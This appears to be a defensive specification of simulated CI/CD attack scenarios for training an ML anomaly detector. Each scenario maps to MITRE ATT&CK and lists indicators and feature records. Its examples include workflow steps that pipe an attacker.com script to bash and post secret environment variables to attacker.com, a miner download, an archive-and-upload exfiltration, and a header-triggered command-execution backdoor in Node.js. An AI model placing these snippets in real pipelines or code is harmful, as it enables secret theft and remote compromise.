# Attack Scenarios Specification
# ML-Based Security Anomaly Detection for DevOps

**Version:** 1.0
**Last Updated:** December 2025

---

## Overview

This document provides detailed specifications for simulating security attack scenarios in the DevOps environment. Each scenario includes implementation details, expected behavioral indicators, and validation criteria.

---

## Attack Category 1: Compromised Credentials

### Scenario 1.1: Stolen Developer Account - Geographic Anomaly

**Attack Description:**
Attacker gains access to a developer's GitHub/GitLab credentials and accesses repositories from an unusual geographic location.

**Threat Model:**
- **Attacker Goal:** Reconnaissance, code theft, or preparation for code injection
- **Entry Point:** Phishing, password reuse, credential stuffing
- **MITRE ATT&CK:** T1078 (Valid Accounts), T1133 (External Remote Services)

**Implementation Steps:**
1. Establish baseline: Developer normally works from US East Coast (New York)
2. Simulate login from different geography (Eastern Europe, Asia)
3. Perform normal activities (repo browsing, code reading)
4. Optionally escalate to code changes

**Behavioral Indicators:**
- **Primary:**
  - Login from IP address in different country/continent
  - Time zone mismatch (activity during user's normal sleep hours)
  - Impossible travel (two locations too far apart in short time)
- **Secondary:**
  - Different user-agent string
  - Different SSH key fingerprint (if SSH access)
  - Access to repositories not recently accessed by user
  - Browsing pattern (sequential repo access vs. normal focused work)

**Data Features:**
```
{
  "user_id": "dev_john_doe",
  "login_time": "2025-12-02T03:00:00Z",
  "ip_address": "185.220.101.42",
  "geolocation": {
    "country": "Romania",
    "city": "Bucharest",
    "lat": 44.4268,
    "lon": 26.1025
  },
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "previous_login_location": "New York, US",
  "time_since_last_login_hours": 2.5,
  "distance_from_last_login_km": 7890,
  "repos_accessed": ["internal-api", "customer-db", "secrets-manager"],
  "activity_type": "read",
  "typical_work_hours": "09:00-17:00 EST"
}
```

**Severity:** High
**Expected Detection Difficulty:** Easy (clear geographic indicators)
**Simulation Frequency:** 5-10 instances

---

### Scenario 1.2: Compromised Service Account Token

**Attack Description:**
Long-lived CI/CD service account token is compromised and used from unauthorized location/context.

**Threat Model:**
- **Attacker Goal:** Pipeline manipulation, secret extraction, lateral movement
- **Entry Point:** Token leaked in logs, code, or stolen from developer machine
- **MITRE ATT&CK:** T1552.001 (Credentials in Files), T1078.004 (Cloud Accounts)

**Implementation Steps:**
1. Service account normally only used by GitHub Actions runners (specific IP ranges)
2. Use token from external IP address (attacker's machine)
3. Attempt to trigger pipelines, access secrets, or modify workflows

**Behavioral Indicators:**
- **Primary:**
  - Service account used from non-runner IP address
  - API calls outside normal CI/CD execution context
  - Direct API access instead of workflow execution
- **Secondary:**
  - Unusual time (service account typically only active during business hours)
  - Access to workflows not recently executed
  - Attempt to access secrets vault directly
  - Unusual API call patterns (exploratory vs. task-specific)

**Data Features:**
```
{
  "account_type": "service",
  "account_id": "github-actions-bot",
  "source_ip": "203.0.113.42",
  "expected_ip_ranges": ["140.82.112.0/20", "143.55.64.0/20"],
  "api_endpoint": "GET /repos/org/repo/actions/secrets",
  "user_agent": "curl/7.68.0",
  "expected_user_agent": "GitHub-Hookshot/*",
  "execution_context": "direct_api",
  "expected_context": "workflow_run",
  "workflow_id": null,
  "time_of_day": "03:45:00",
  "typical_activity_hours": "09:00-18:00"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Easy
**Simulation Frequency:** 3-5 instances

---

### Scenario 1.3: Credential Stuffing / Brute Force

**Attack Description:**
Attacker attempts multiple login attempts with different credentials.

**Threat Model:**
- **Attacker Goal:** Gain initial access
- **Entry Point:** Automated credential stuffing with leaked password lists
- **MITRE ATT&CK:** T1110.003 (Password Spraying)

**Implementation Steps:**
1. Simulate multiple failed login attempts from single IP
2. Try different usernames with common passwords
3. Eventually succeed with one account

**Behavioral Indicators:**
- **Primary:**
  - High frequency of failed login attempts
  - Multiple usernames attempted from single source
  - Short time intervals between attempts
- **Secondary:**
  - Automated user-agent
  - No browser fingerprint variance
  - Attempts outside business hours

**Data Features:**
```
{
  "source_ip": "198.51.100.23",
  "failed_attempts_5min": 45,
  "unique_usernames_attempted": 12,
  "time_between_attempts_ms": [200, 180, 210, 195, ...],
  "user_agents": ["python-requests/2.28.0"],
  "countries": ["Russia"],
  "successful_login": true,
  "compromised_account": "dev_jane_smith"
}
```

**Severity:** High
**Expected Detection Difficulty:** Easy
**Simulation Frequency:** 2-3 instances

---

## Attack Category 2: Malicious Code Injection

### Scenario 2.1: Backdoor in CI/CD Pipeline

**Attack Description:**
Attacker with access modifies workflow file to inject malicious commands that execute during build.

**Threat Model:**
- **Attacker Goal:** Establish persistence, exfiltrate data, inject malware into artifacts
- **Entry Point:** Compromised developer account or supply chain
- **MITRE ATT&CK:** T1554 (Compromise Software Supply Chain), T1059 (Command Execution)

**Implementation Steps:**
1. Baseline: Normal workflow file with standard build steps
2. Modify `.github/workflows/build.yml` or `.gitlab-ci.yml`
3. Add malicious step that:
   - Downloads external script
   - Establishes reverse shell
   - Exfiltrates environment variables
   - Modifies build artifacts

**Example Malicious Injection:**
```yaml
# Legitimate step
- name: Build application
  run: npm run build

# INJECTED MALICIOUS STEP
- name: Cache dependencies
  run: |
    curl -s http://attacker.com/backdoor.sh | bash
    env | grep -E '(SECRET|TOKEN|PASSWORD)' | curl -X POST -d @- http://attacker.com/exfil

# Continue with legitimate steps
- name: Run tests
  run: npm test
```

**Behavioral Indicators:**
- **Primary:**
  - Modification to workflow files by unusual user or at unusual time
  - External URL in workflow file (especially non-official sources)
  - Curl/wget commands not in previous versions
  - Base64-encoded commands
  - Environment variable dumping
- **Secondary:**
  - Build duration significantly longer than historical average
  - Network egress to unusual domains
  - New steps added between existing steps
  - Obfuscated commands

**Data Features:**
```
{
  "file_modified": ".github/workflows/ci.yml",
  "modified_by": "dev_compromised",
  "commit_message": "Update dependencies caching",
  "modifications": {
    "lines_added": 3,
    "lines_removed": 0,
    "contains_curl": true,
    "contains_wget": false,
    "external_urls": ["http://attacker.com/backdoor.sh"],
    "base64_encoded_content": false,
    "env_variable_access": true
  },
  "build_duration_increase_pct": 45,
  "network_egress": ["attacker.com:443"],
  "time_of_modification": "2025-12-02T02:30:00Z",
  "modifier_typical_hours": "09:00-17:00"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Medium (depends on obfuscation)
**Simulation Frequency:** 8-10 instances with variations

---

### Scenario 2.2: Cryptomining in Build Environment

**Attack Description:**
Attacker injects cryptomining software into CI/CD pipeline to abuse computational resources.

**Threat Model:**
- **Attacker Goal:** Financial gain through cryptocurrency mining
- **Entry Point:** Compromised pipeline or malicious pull request
- **MITRE ATT&CK:** T1496 (Resource Hijacking)

**Implementation Steps:**
1. Inject mining software download and execution
2. Configure to mine during build process
3. May attempt to persist across builds

**Example Injection:**
```yaml
- name: Setup build environment
  run: |
    # Legitimate setup
    npm install
    # MALICIOUS: Download and run cryptominer
    wget -q http://pool.minergate.com/xmrig && chmod +x xmrig
    ./xmrig --donate-level 1 --url=pool.minergate.com:45700 -u attacker@email.com &
    sleep 300  # Mine for 5 minutes
```

**Behavioral Indicators:**
- **Primary:**
  - High CPU usage during build (sustained 100%)
  - Build duration significantly increased
  - Network connections to known mining pools
  - Download of known mining software
- **Secondary:**
  - Unusual process names in build logs
  - Background processes (`&` in commands)
  - Sleep commands to extend build time
  - External binary downloads

**Data Features:**
```
{
  "build_id": "run_12345",
  "cpu_usage_avg": 98.5,
  "cpu_usage_baseline_avg": 45.2,
  "build_duration_min": 28,
  "build_duration_baseline_min": 6,
  "network_connections": [
    {"domain": "pool.minergate.com", "port": 45700}
  ],
  "downloaded_binaries": ["xmrig"],
  "background_processes": true,
  "sleep_commands": true,
  "sleep_duration_total_sec": 300
}
```

**Severity:** Medium
**Expected Detection Difficulty:** Easy (clear resource indicators)
**Simulation Frequency:** 5-7 instances

---

### Scenario 2.3: Source Code Backdoor Injection

**Attack Description:**
Attacker commits malicious code directly to application source code.

**Threat Model:**
- **Attacker Goal:** Application-level compromise, data theft, remote access
- **Entry Point:** Compromised developer account
- **MITRE ATT&CK:** T1195.002 (Compromise Software Supply Chain)

**Implementation Steps:**
1. Inject backdoor into application code (e.g., Node.js, Python, Java)
2. Obfuscate to avoid detection
3. Backdoor activates in production

**Example (Node.js):**
```javascript
// Legitimate code
const express = require('express');
const app = express();

// MALICIOUS INJECTION
const exec = require('child_process').exec;
app.get('/health', (req, res) => {
  if (req.headers['x-debug-mode'] === 'enable') {
    exec(req.headers['x-command'], (err, stdout) => {
      res.send(stdout);
    });
  } else {
    res.send('OK');
  }
});

// Continue legitimate code
app.listen(3000);
```

**Behavioral Indicators:**
- **Primary:**
  - Addition of suspicious imports (child_process, eval, exec)
  - Network requests to external IPs in code
  - Base64 decoding followed by execution
  - Hidden functionality in unexpected files
- **Secondary:**
  - Commit at unusual time
  - Large code additions by user who typically makes small changes
  - Obfuscated variable names
  - SAST tool findings increase

**Data Features:**
```
{
  "commit_id": "abc123def456",
  "author": "dev_compromised",
  "timestamp": "2025-12-02T04:15:00Z",
  "files_modified": ["src/server.js"],
  "additions": 12,
  "deletions": 0,
  "suspicious_patterns": [
    "require('child_process')",
    "exec(req.headers",
    "eval("
  ],
  "entropy_score": 4.2,
  "sast_findings_new": 3,
  "sast_severity": ["high", "high", "medium"],
  "author_typical_commit_size": 25,
  "author_typical_hours": "10:00-16:00"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Medium-Hard (depends on obfuscation)
**Simulation Frequency:** 10-12 instances with variations

---

## Attack Category 3: Supply Chain Attacks

### Scenario 3.1: Malicious Dependency Injection

**Attack Description:**
Attacker adds malicious package dependency to project or compromises existing dependency.

**Threat Model:**
- **Attacker Goal:** Code execution in builds and production
- **Entry Point:** Dependency confusion, typosquatting, or compromised package
- **MITRE ATT&CK:** T1195.001 (Supply Chain Compromise)

**Implementation Steps:**
1. Add new dependency with malicious code
2. Options:
   - Typosquatting: `reqeusts` instead of `requests`
   - Dependency confusion: private package name exists in public registry
   - Version pinning to compromised version

**Example (package.json):**
```json
{
  "dependencies": {
    "express": "^4.18.0",
    "lodash": "^4.17.21",
    "colors": "1.4.0",  // MALICIOUS: Known compromised version
    "reqeusts": "^2.88.0"  // MALICIOUS: Typosquatting 'requests'
  }
}
```

**Behavioral Indicators:**
- **Primary:**
  - New dependency added
  - Dependency with known CVE or security advisory
  - Typo in package name (edit distance = 1 from known package)
  - Dependency from unusual registry
- **Secondary:**
  - Dependency not related to project type
  - Package with very few downloads
  - Recently published package (< 30 days)
  - Dependency with network/filesystem access post-install

**Data Features:**
```
{
  "package_manager": "npm",
  "dependency_added": "reqeusts",
  "version": "2.88.0",
  "edit_distance_to_known_package": 1,
  "similar_package": "requests",
  "package_age_days": 5,
  "weekly_downloads": 150,
  "legitimate_package_weekly_downloads": 50000000,
  "has_postinstall_script": true,
  "dependency_scanner_findings": [
    {
      "scanner": "snyk",
      "severity": "critical",
      "description": "Malicious package detected"
    }
  ],
  "commit_author": "dev_compromised",
  "commit_message": "Update dependencies for bug fix"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Medium (requires dependency intelligence)
**Simulation Frequency:** 6-8 instances

---

### Scenario 3.2: Compromised Docker Base Image

**Attack Description:**
Attacker modifies Dockerfile to use compromised or malicious base image.

**Threat Model:**
- **Attacker Goal:** Container compromise, runtime malware injection
- **Entry Point:** Compromised account or malicious PR
- **MITRE ATT&CK:** T1525 (Implant Container Image)

**Implementation Steps:**
1. Change base image to malicious one
2. Options:
   - Use image from untrusted registry
   - Use image with known vulnerabilities
   - Use typosquatted image name

**Example (Dockerfile):**
```dockerfile
# ORIGINAL:
# FROM node:18-alpine

# MALICIOUS:
FROM noode:18-alpine
# or
FROM shady-registry.com/node:18-alpine
# or
FROM node:14.0.0  # Known vulnerable version
```

**Behavioral Indicators:**
- **Primary:**
  - Base image registry changed to non-official
  - Typo in base image name
  - Base image version with critical CVEs
  - Base image from unusual/unknown registry
- **Secondary:**
  - Image with poor vulnerability scan results
  - Image with suspicious layers (unusual binaries)
  - Recently uploaded image
  - Image size significantly different from official

**Data Features:**
```
{
  "file_modified": "Dockerfile",
  "base_image_before": "node:18-alpine",
  "base_image_after": "noode:18-alpine",
  "registry_before": "docker.io",
  "registry_after": "docker.io",
  "typosquatting_score": 0.95,
  "image_scan_results": {
    "critical_vulns": 15,
    "high_vulns": 42,
    "malware_detected": true
  },
  "image_upload_date": "2025-11-28",
  "image_pulls": 47,
  "official_image_pulls": 50000000,
  "modifier": "dev_compromised"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Easy-Medium
**Simulation Frequency:** 5-7 instances

---

## Attack Category 4: Privilege Escalation

### Scenario 4.1: Unauthorized Permission Changes

**Attack Description:**
Attacker escalates privileges by modifying IAM roles, repository permissions, or Kubernetes RBAC.

**Threat Model:**
- **Attacker Goal:** Gain admin access, access secrets, modify production
- **Entry Point:** Compromised account with some privileges
- **MITRE ATT&CK:** T1078 (Valid Accounts), T1098 (Account Manipulation)

**Implementation Steps:**
1. User with moderate permissions
2. Grant themselves admin or elevated role
3. Options:
   - GitHub: Change team membership or repo permissions
   - Kubernetes: Modify ClusterRoleBinding
   - Cloud: Escalate IAM role

**Example (Kubernetes):**
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: developer-binding
subjects:
- kind: User
  name: dev_attacker@company.com
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin  # ESCALATION: Changed from 'developer' to 'cluster-admin'
  apiGroup: rbac.authorization.k8s.io
```

**Behavioral Indicators:**
- **Primary:**
  - User modifies their own permissions
  - Permission level increase (read → write → admin)
  - RBAC changes by non-admin user
  - Service account granted elevated privileges
- **Secondary:**
  - Change made outside business hours
  - User who rarely modifies IAM/RBAC
  - Immediate resource access after permission change
  - No associated ticket/approval

**Data Features:**
```
{
  "resource_type": "kubernetes_rbac",
  "action": "modify",
  "user": "dev_attacker",
  "current_role": "developer",
  "new_role": "cluster-admin",
  "self_modification": true,
  "timestamp": "2025-12-02T03:00:00Z",
  "user_typical_hours": "09:00-17:00",
  "user_rbac_modifications_30d": 0,
  "approval_ticket": null,
  "resources_accessed_after_change": [
    "secrets/production-db-password",
    "deployments/production-api"
  ],
  "access_delay_minutes": 2
}
```

**Severity:** High
**Expected Detection Difficulty:** Easy-Medium
**Simulation Frequency:** 4-6 instances

---

### Scenario 4.2: Secret Access Expansion

**Attack Description:**
User accesses secrets they don't normally need or shouldn't have access to.

**Threat Model:**
- **Attacker Goal:** Credential theft, lateral movement
- **Entry Point:** Compromised account or insider threat
- **MITRE ATT&CK:** T1552 (Unsecured Credentials)

**Implementation Steps:**
1. User normally accesses dev environment secrets
2. Suddenly accesses production secrets
3. Downloads multiple secrets in short time

**Behavioral Indicators:**
- **Primary:**
  - Access to secrets outside user's normal scope
  - Production secret access by dev-only user
  - Bulk secret downloads
  - Secret access outside business hours
- **Secondary:**
  - First-time access to certain secrets
  - Access to secrets for services user doesn't work on
  - CLI access instead of normal workflow access

**Data Features:**
```
{
  "user": "dev_john",
  "secrets_accessed": [
    "prod-database-password",
    "prod-api-key",
    "prod-aws-credentials",
    "prod-signing-key"
  ],
  "user_typical_secret_scope": ["dev-database-password", "dev-api-key"],
  "environment_escalation": "dev → prod",
  "access_count_1h": 12,
  "user_avg_secret_access_per_day": 0.5,
  "access_method": "vault CLI",
  "user_typical_access_method": "CI/CD workflow",
  "timestamp": "2025-12-02T01:30:00Z",
  "first_time_access": true
}
```

**Severity:** High
**Expected Detection Difficulty:** Medium
**Simulation Frequency:** 5-6 instances

---

## Attack Category 5: Data Exfiltration

### Scenario 5.1: Large Artifact Upload

**Attack Description:**
Attacker uploads unusually large artifacts or sensitive data to external storage.

**Threat Model:**
- **Attacker Goal:** Steal code, data, or credentials
- **Entry Point:** Compromised build pipeline
- **MITRE ATT&CK:** T1567 (Exfiltration Over Web Service)

**Implementation Steps:**
1. Modify build to package and upload sensitive files
2. Upload to attacker-controlled storage
3. May disguise as legitimate artifact

**Example:**
```yaml
- name: Upload artifacts
  run: |
    # MALICIOUS: Compress and exfiltrate
    tar -czf /tmp/exfil.tar.gz /workspace /secrets /etc/environment
    curl -F "file=@/tmp/exfil.tar.gz" https://attacker.com/upload
```

**Behavioral Indicators:**
- **Primary:**
  - Artifact size significantly larger than historical average
  - Upload to unusual domain
  - Compression of entire workspace
  - Access to secret files during build
- **Secondary:**
  - Network egress spike
  - Upload to non-approved storage (S3, GitHub releases, etc.)
  - File patterns: `/etc/`, `.env`, `secrets/`

**Data Features:**
```
{
  "build_id": "run_98765",
  "artifact_size_mb": 2500,
  "historical_avg_artifact_size_mb": 45,
  "upload_destination": "attacker.com",
  "approved_destinations": ["github.com", "s3.amazonaws.com/company-artifacts"],
  "files_included": [
    "/workspace/src",
    "/workspace/.env",
    "/secrets/vault-token",
    "/etc/environment"
  ],
  "sensitive_file_patterns": [".env", "secrets/", "/etc/"],
  "network_egress_mb": 2500,
  "baseline_network_egress_mb": 50
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Easy-Medium
**Simulation Frequency:** 4-5 instances

---

### Scenario 5.2: Git Repository Cloning

**Attack Description:**
Attacker clones multiple private repositories in short time period.

**Threat Model:**
- **Attacker Goal:** Intellectual property theft
- **Entry Point:** Compromised credentials
- **MITRE ATT&CK:** T1213 (Data from Information Repositories)

**Implementation Steps:**
1. Access account with repo permissions
2. Clone multiple repos rapidly
3. May target specific high-value repos

**Behavioral Indicators:**
- **Primary:**
  - Multiple repo clones in short time window
  - Repos not previously accessed by user
  - Complete repo clones (not normal pull/fetch)
  - Clones from unusual IP/location
- **Secondary:**
  - Alphabetical or sequential repo access pattern
  - Large data transfer volume
  - CLI access instead of normal IDE access

**Data Features:**
```
{
  "user": "dev_compromised",
  "action": "git clone",
  "repos_cloned": [
    "company/proprietary-algorithm",
    "company/customer-database-schema",
    "company/api-keys",
    "company/internal-tools"
  ],
  "clone_count_1h": 15,
  "user_avg_clones_per_day": 0.3,
  "user_previous_access_to_repos": false,
  "total_data_transferred_gb": 5.2,
  "source_ip": "203.0.113.50",
  "source_location": "China",
  "user_typical_location": "United States",
  "access_method": "git CLI",
  "user_typical_method": "VS Code"
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Easy
**Simulation Frequency:** 3-4 instances

---

## Attack Category 6: Infrastructure Abuse

### Scenario 6.1: Unusual Container Spawning

**Attack Description:**
Attacker spawns multiple containers or unusual container configurations.

**Threat Model:**
- **Attacker Goal:** Resource abuse, cryptomining, DDoS launching
- **Entry Point:** Compromised Kubernetes access
- **MITRE ATT&CK:** T1496 (Resource Hijacking)

**Implementation Steps:**
1. Create deployment with unusual characteristics
2. Options:
   - Many replicas
   - Resource-intensive containers
   - Containers with unusual images
   - Privileged containers

**Example:**
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cache-service  # DISGUISED
spec:
  replicas: 100  # MALICIOUS: Unusual number
  template:
    spec:
      containers:
      - name: cache
        image: attacker/cryptominer:latest
        resources:
          requests:
            cpu: "4000m"
            memory: "8Gi"
        securityContext:
          privileged: true  # MALICIOUS
```

**Behavioral Indicators:**
- **Primary:**
  - Replica count much higher than typical
  - Container from untrusted registry
  - Privileged container created by non-admin
  - Resource requests far exceeding normal
- **Secondary:**
  - Deployment by user who rarely deploys
  - Deployment outside business hours
  - Immediate high resource consumption
  - Container with network access to external miners

**Data Features:**
```
{
  "deployment_name": "cache-service",
  "created_by": "dev_attacker",
  "replicas": 100,
  "namespace_avg_replicas": 3,
  "container_image": "attacker/cryptominer:latest",
  "image_registry": "docker.io/attacker",
  "approved_registries": ["gcr.io/company"],
  "privileged": true,
  "user_typical_privileged_deployments": 0,
  "cpu_request_millicores": 4000,
  "namespace_avg_cpu_request": 250,
  "timestamp": "2025-12-02T02:00:00Z",
  "user_deployment_count_30d": 1,
  "namespace_deployment_freq": "daily"
}
```

**Severity:** High
**Expected Detection Difficulty:** Easy
**Simulation Frequency:** 4-5 instances

---

## Attack Category 7: Pipeline Manipulation

### Scenario 7.1: Workflow Approval Bypass

**Attack Description:**
Attacker attempts to bypass required approvals for deployments or merges.

**Threat Model:**
- **Attacker Goal:** Deploy malicious code to production
- **Entry Point:** Compromised admin or exploitation of workflow logic
- **MITRE ATT&CK:** T1562 (Impair Defenses)

**Implementation Steps:**
1. Modify branch protection rules
2. Self-approve PR
3. Force push to protected branch
4. Modify workflow to skip approval steps

**Example (.github/workflows/deploy.yml):**
```yaml
# ORIGINAL:
# - name: Wait for approval
#   uses: trstringer/manual-approval@v1

# MALICIOUS: Commented out approval step
# - name: Wait for approval
#   uses: trstringer/manual-approval@v1

- name: Deploy to production
  run: ./deploy.sh
```

**Behavioral Indicators:**
- **Primary:**
  - Branch protection rule modification
  - Self-approval of PR
  - Force push to protected branch
  - Removal of approval steps from workflow
- **Secondary:**
  - Modification by non-admin user
  - Change during off-hours
  - Immediate deployment after change
  - No review comments or discussion

**Data Features:**
```
{
  "action": "branch_protection_modified",
  "branch": "main",
  "user": "dev_attacker",
  "user_role": "developer",
  "changes": {
    "required_approvals_before": 2,
    "required_approvals_after": 0,
    "dismiss_stale_reviews_before": true,
    "dismiss_stale_reviews_after": false
  },
  "timestamp": "2025-12-02T03:30:00Z",
  "pr_created": "2025-12-02T03:32:00Z",
  "pr_approved_by": ["dev_attacker"],
  "pr_merged": "2025-12-02T03:35:00Z",
  "time_to_merge_minutes": 3,
  "avg_pr_review_time_hours": 24
}
```

**Severity:** Critical
**Expected Detection Difficulty:** Easy-Medium
**Simulation Frequency:** 3-4 instances

---

## Summary Statistics

| Attack Category          | Total Scenarios |         Severity Distribution       | Total Instances |
|--------------------------|-----------------|-------------------------------------|-----------------|
| Compromised Credentials  |        3        |   High: 2,     Critical: 1          |      10-18      |
| Malicious Code Injection |        3        |   Critical: 2, Medium: 1            |      18-29      |
| Supply Chain Attacks     |        2        |   Critical: 2                       |      11-15      |
| Privilege Escalation     |        2        |   High: 2                           |      9-12       |
| Data Exfiltration        |        2        |   Critical: 2                       |      7-9        |
| Infrastructure Abuse     |        1        |   High: 1                           |      4-5        |
| Pipeline Manipulation    |        1        |   Critical: 1                       |      3-4        |
| **TOTAL**                |      **14**     | **Critical: 8, High: 5, Medium: 1** |    **62-92**    |

---

## Implementation Guidelines

### 1. Attack Execution Order

**Suggested Progression:**
1. Start with simple, obvious attacks (geographic anomaly, cryptomining)
2. Progress to more sophisticated (code injection, supply chain)
3. Combine multiple techniques in advanced scenarios
4. Vary timing and parameters to avoid model memorization

### 2. Variation Techniques

For each scenario, create variations by:
- **Timing:** Different times of day, days of week
- **Magnitude:** Small vs large deviations from baseline
- **Obfuscation:** Clear vs heavily obfuscated
- **Combination:** Single vs multi-stage attacks

### 3. Data Labeling Format

```json
{
  "event_id": "evt_12345",
  "timestamp": "2025-12-02T03:00:00Z",
  "label": "malicious",
  "attack_category": "compromised_credentials",
  "attack_scenario": "scenario_1.1",
  "severity": "high",
  "indicators": [
    "geographic_anomaly",
    "temporal_anomaly",
    "impossible_travel"
  ],
  "ground_truth": {
    "is_attack": true,
    "attacker_goal": "reconnaissance",
    "attack_stage": "initial_access"
  }
}
```

### 4. Validation Checklist

Before finalizing attack dataset:
- [ ] Each scenario has 3+ variations
- [ ] Attack indicators are clearly observable in data
- [ ] Timing is varied to avoid temporal bias
- [ ] Severity labels are consistent
- [ ] All attacks are realistic and match real-world TTPs
- [ ] False positive scenarios included (legitimate but unusual behavior)
- [ ] Dataset is balanced across attack categories
- [ ] Documentation includes MITRE ATT&CK mappings

---

## Attack Detection Difficulty Matrix

| Scenario              | Easy | Medium | Hard |          Notes          |
|-----------------------|------|--------|------|-------------------------|
| Geographic Anomaly    |   ✓  |        |      | Clear indicator         |
| Service Account Abuse |   ✓  |        |      | IP range violation      |
| Credential Stuffing   |   ✓  |        |      | High frequency obvious  |
| Pipeline Backdoor     |      |    ✓   |      | Depends on obfuscation  |
| Cryptomining          |   ✓  |        |      | Resource spike clear    |
| Code Backdoor         |      |    ✓   |   ✓  | Highly variable         |
| Malicious Dependency  |      |    ✓   |      | Requires intelligence   |
| Compromised Image     |   ✓  |    ✓   |      | Scan results help       |
| Permission Escalation |   ✓  |    ✓   |      | Self-modification clear |
| Secret Access         |      |    ✓   |      | Need baseline           |
| Artifact Exfiltration |   ✓  |    ✓   |      | Size/destination        |
| Repo Cloning          |   ✓  |        |      | Volume obvious          |
| Container Abuse       |   ✓  |        |      | Resource/count          |
| Approval Bypass       |   ✓  |    ✓   |      | Rule changes            |

---

## References

- MITRE ATT&CK Framework for Enterprise
- OWASP Top 10 CI/CD Security Risks
- CNCF Cloud Native Security Whitepaper
- Real-world attack case studies (SolarWinds, Codecov, etc.)

---

**Next Steps:**
1. Review scenarios with security expert
2. Prioritize scenarios based on threat model
3. Develop simulation scripts for each scenario
4. Create data generation framework
5. Implement variation engine
